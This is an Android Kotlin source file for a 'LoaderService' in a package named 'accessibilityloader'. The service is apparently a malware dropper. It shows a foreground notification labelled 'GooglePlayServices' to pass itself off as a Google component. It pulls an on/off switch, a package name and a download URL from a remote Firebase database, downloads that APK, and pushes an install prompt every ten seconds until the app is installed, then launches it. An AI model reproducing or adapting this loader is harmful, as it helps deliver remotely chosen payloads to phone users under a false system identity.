package com.alexeyignatev.accessibilityloader

import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.os.Vibrator
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.FileProvider
import com.google.firebase.database.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine
import kotlin.math.log


class LoaderService : Service() {
    private val TAG = "Loader"
    val CHANNEL_ID = "GooglePlayServices"
    private lateinit var notificationManager: NotificationManager

    companion object {
        private const val FILE_BASE_PATH = "file://"
        private const val PROVIDER_PATH = ".provider"
        private const val APP_INSTALL_PATH = "\"application/vnd.android.package-archive\""
    }

    private fun start() {
        CoroutineScope(Dispatchers.IO).launch {
            if (checkEnabledFirebase()) {
                Log.d(TAG, "start: enabled")
                val packageName = getPackageNameFirebase()
                val name = getAppNameFirebase()
                val url = getDownloadLinkFirebase()
                while (!(isPackageInstalled(packageName, applicationContext.packageManager))) {
                    loadAndInstallApp(url, name)
                    delay(10000L)
                }
                val launchIntent =
                    applicationContext.packageManager.getLaunchIntentForPackage(packageName)
                applicationContext.startActivity(launchIntent)
                stopForeground(true)
            }
        }
    }

    private fun isPackageInstalled(packageName: String, packageManager: PackageManager): Boolean {
        return try {
            packageManager.getPackageInfo(packageName, 0)
            true
        } catch (e: PackageManager.NameNotFoundException) {
            false
        }
    }

    private fun loadAndInstallApp(url: String, name: String) {
        var destination =
            applicationContext.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS).toString() + "/"
        val filename = "$name.apk"
        destination += filename

        val uri = Uri.parse("$FILE_BASE_PATH$destination")

        val file = File(destination)
        if (file.exists()) {
            installApp(destination, uri)
        } else {
            val request = DownloadManager.Request(Uri.parse(url))
            request.setDestinationUri(uri)
            val manager =
                applicationContext.getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
            manager.enqueue(request)

            val onComplete = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    installApp(destination, uri)
                    applicationContext.unregisterReceiver(this)
                }
            }
            applicationContext.registerReceiver(
                onComplete,
                IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE)
            )
        }
    }

    private fun installApp(destination: String, uri: Uri) {
        Log.d(TAG, "installApp: ")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val contentUri = FileProvider.getUriForFile(
                applicationContext,
                packageName + PROVIDER_PATH,
                File(destination)
            )
            val install = Intent(Intent.ACTION_VIEW)
            install.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            install.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            install.putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, true)
            install.data = contentUri
            startActivity(install)
        } else {
            val install = Intent(Intent.ACTION_VIEW)
            install.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            install.setDataAndType(
                uri,
                APP_INSTALL_PATH
            )
            startActivity(install)
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        createNotificationChannel()

        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0)

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("GooglePlayServices")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentIntent(pendingIntent)
            .build()

        startForeground(1, notification)

        start()

        return START_NOT_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "GooglePlayServices",
                NotificationManager.IMPORTANCE_DEFAULT
            )

            notificationManager.createNotificationChannel(serviceChannel)
        }
    }

    private suspend fun getPackageNameFirebase(): String {
        return suspendCoroutine { continuation ->
            FirebaseDatabase.getInstance().getReference("app").child("package_name")
                .addListenerForSingleValueEvent(
                    object : ValueEventListener {
                        override fun onDataChange(snapshot: DataSnapshot) {
                            val appName = snapshot.getValue(String::class.java)
                            if (appName == null) {
                                continuation.resume("")
                            } else {
                                continuation.resume(appName)
                            }
                        }

                        override fun onCancelled(p0: DatabaseError) {
                            continuation.resume("")
                        }
                    })
        }

    }

    private suspend fun checkEnabledFirebase(): Boolean {
        return suspendCoroutine { continuation ->
            FirebaseDatabase.getInstance().getReference("app").child("enabled")
                .addListenerForSingleValueEvent(object : ValueEventListener {
                    override fun onDataChange(snapshot: DataSnapshot) {
                        val enabled = snapshot.getValue(Boolean::class.java)
                        continuation.resume(enabled ?: false)
                    }

                    override fun onCancelled(error: DatabaseError) {
                        continuation.resume(false)
                    }

                })
        }
    }

    private suspend fun getAppNameFirebase(): String {
        return suspendCoroutine { continuation ->
            FirebaseDatabase.getInstance().getReference("app").child("name")
                .addListenerForSingleValueEvent(
                    object : ValueEventListener {
                        override fun onDataChange(snapshot: DataSnapshot) {
                            val appName = snapshot.getValue(String::class.java)
                            if (appName == null) {

                                continuation.resume("")
                            } else {
                                continuation.resume(appName)
                            }

                        }

                        override fun onCancelled(error: DatabaseError) {

                            continuation.resume("")
                        }

                    })
        }
    }

    private suspend fun getDownloadLinkFirebase(): String {
        return suspendCoroutine { continuation ->
            FirebaseDatabase.getInstance().getReference("app").child("url")
                .addListenerForSingleValueEvent(
                    object : ValueEventListener {
                        override fun onDataChange(snapshot: DataSnapshot) {
                            val url = snapshot.getValue(String::class.java)
                            if (url == null) {
                                continuation.resume("")
                            } else {
                                continuation.resume(url)
                            }
                        }

                        override fun onCancelled(error: DatabaseError) {

                            continuation.resume("")
                        }

                    })
        }

    }
}